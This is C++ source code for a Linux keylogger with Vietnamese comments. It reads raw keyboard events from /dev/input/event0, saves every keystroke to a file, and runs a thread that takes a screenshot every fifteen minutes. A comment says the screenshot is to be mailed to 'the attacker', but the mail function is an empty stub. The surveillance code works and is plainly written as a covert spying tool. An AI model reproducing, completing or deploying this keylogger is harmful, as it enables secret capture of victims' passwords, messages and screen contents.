#include <iostream>
#include <stdio.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <cstdlib>
#include <fcntl.h>
#include <unistd.h>
#include <string>
#include <fstream>
#include <ctime>
#include <thread>
using namespace std;
#define UK "UNKNOWN"
#define ESCAPE(key) (key == KEY_ESC)
#define SHIFT(key)  ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))
static const char *keycodes[] =
{
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
    "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};
static const char *shifted_keycodes[] =
{
    "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
    "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
    "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
    "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
    "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
    "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
    "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};
void Capture(){							 //Capture Screenshot
	char install_Gnome[50] = "apt install gnome-screenshot";  // Cai dat gnome-screenshot
   	system(install_Gnome);
	char capture[50] = "gnome-screenshot -f /tmp/screenshot"; // chup anh man hinh
   	system(capture);
}
void SendMail(){
	cout << "Send Mail";
}
void Send(){							//15p gui chup anh man hinh va gui mail cho attacker
	sleep(15*60);
	Capture();
	SendMail();
}
void Keylogger(){						//Ghi keybroad
	fstream f;
	f.open("keylog.txt", ios::out);
	int keyboard_fd = open("/dev/input/event0", O_RDONLY);
	struct input_event event;
	int shift_flag = 0;
	bool running = true;
	while (running) {
	    	read(keyboard_fd, &event, sizeof(event));
        	if (event.type == EV_KEY && event.value == 1){ 
       	        	if (SHIFT(event.code))
     	        		shift_flag = event.code;
     	       		if (shift_flag && !SHIFT(event.code)){
				printf("%s\n", shifted_keycodes[event.code]); 
				f<< (char *) shifted_keycodes[event.code];
      	      		}
      	        	else if (!shift_flag && !SHIFT(event.code)){
				printf("%s\n", keycodes[event.code]);
				f<< (char *) keycodes[event.code];
			}
		}
		else {
         	        if (event.type == EV_KEY && event.value == 0)
         		       if (SHIFT(event.code))
         		           shift_flag = 0;   	
		}	
	}
	f.close();
}

int main(int argc, char **argv){		// Tao 2 thread chay song song
	cout << "1";	
	thread one(Keylogger);
	thread two(Send);
	one.join();
	two.join();
	return 0;	
}
